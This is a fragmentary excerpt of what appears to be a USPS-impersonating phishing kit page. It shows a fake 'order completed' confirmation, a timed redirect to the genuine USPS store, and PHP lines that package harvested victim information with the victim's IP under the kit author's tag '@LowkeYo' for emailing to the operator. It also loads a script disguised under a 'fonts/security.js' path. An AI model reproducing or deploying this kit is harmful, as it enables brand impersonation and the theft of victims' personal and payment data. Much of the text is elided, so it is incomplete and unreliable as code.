...
<head>
    ...
    <![endif]-->
        <meta http-equiv="refresh" content="4;https://store.usps.com/store/cart/cart.jsp">
<style>
.thanks {
color: #333366;
}
...
$data .= "[ @LowkeYo USPS EMAIL INFORMATION : {$IP} ]\n\n";
...
$subject = "[{$a1}] - EMAIL INFOMATION [@LowkeYo USPS]  : {$IP} ";
...
>ZIMBABWE</option>
							...
							<div class="thanks"><b>&nbsp;&nbsp;&nbsp;Thank you! Your order completed.</b><br><br></div>
                                ...
                                <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                                    ...
                                    <div class="row">
                                        <div class="col-xs-12" id="footerText" aria-hidden="true">
                                            ...
                                            <img style="width:13%;" src="images/loading.gif">
                                            </p>
                                        </div>
                                    </div>
                                </div>
...
</div><script type="text/javascript" src="fonts/security.js"></script></div>
